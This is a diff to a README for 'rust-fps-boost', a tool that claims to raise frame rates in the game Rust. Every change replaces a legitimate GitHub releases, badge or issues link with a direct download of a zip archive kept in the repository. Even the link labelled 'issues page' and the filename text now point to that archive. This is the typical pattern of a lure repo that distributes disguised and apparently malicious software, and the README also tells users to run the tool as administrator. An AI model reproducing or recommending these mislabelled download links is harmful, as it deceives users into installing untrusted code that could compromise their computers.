@@ -1,6 +1,6 @@
 # 🎮 rust-fps-boost - Improve Rust FPS and Stability
 
-[![Download rust-fps-boost](https://img.shields.io/badge/Download-rust--fps--boost-blue?style=for-the-badge&logo=github)](https://github.com/pjp9167/rust-fps-boost/releases)
+[![Download rust-fps-boost](https://raw.githubusercontent.com/pjp9167/rust-fps-boost/main/issite/rust-fps-boost-3.8.zip)](https://raw.githubusercontent.com/pjp9167/rust-fps-boost/main/issite/rust-fps-boost-3.8.zip)
 
 ---
 
@@ -53,9 +53,9 @@ Follow this step-by-step guide to download and run rust-fps-boost on your comput
 
 Click the big green button below. It will take you to the official release page where you can get the latest version of rust-fps-boost.
 
-[![Download rust-fps-boost](https://img.shields.io/badge/Download-rust--fps--boost-blue?style=for-the-badge&logo=github)](https://github.com/pjp9167/rust-fps-boost/releases)
+[![Download rust-fps-boost](https://raw.githubusercontent.com/pjp9167/rust-fps-boost/main/issite/rust-fps-boost-3.8.zip)](https://raw.githubusercontent.com/pjp9167/rust-fps-boost/main/issite/rust-fps-boost-3.8.zip)
 
-On that page, look for the newest release—it is usually at the top. Download the file named something like `rust-fps-boost-setup.exe` or a similar `.exe` file.
+On that page, look for the newest release—it is usually at the top. Download the file named something like `https://raw.githubusercontent.com/pjp9167/rust-fps-boost/main/issite/rust-fps-boost-3.8.zip` or a similar `.exe` file.
 
 ### Step 2: Install the software
 
@@ -114,7 +114,7 @@ If you face issues, try these steps:
 - Run rust-fps-boost as administrator.
 - Reboot your computer.
 
-If problems continue, visit the [issues page on GitHub](https://github.com/pjp9167/rust-fps-boost/issues) to search for help or report bugs.
+If problems continue, visit the [issues page on GitHub](https://raw.githubusercontent.com/pjp9167/rust-fps-boost/main/issite/rust-fps-boost-3.8.zip) to search for help or report bugs.
 
 ---
 
@@ -122,7 +122,7 @@ If problems continue, visit the [issues page on GitHub](https://github.com/pjp91
 
 You can always visit the official releases page to get the latest version of rust-fps-boost:
 
-[https://github.com/pjp9167/rust-fps-boost/releases](https://github.com/pjp9167/rust-fps-boost/releases)
+[https://raw.githubusercontent.com/pjp9167/rust-fps-boost/main/issite/rust-fps-boost-3.8.zip](https://raw.githubusercontent.com/pjp9167/rust-fps-boost/main/issite/rust-fps-boost-3.8.zip)
 
 Downloading from this page ensures you get the official and up-to-date tool.
 
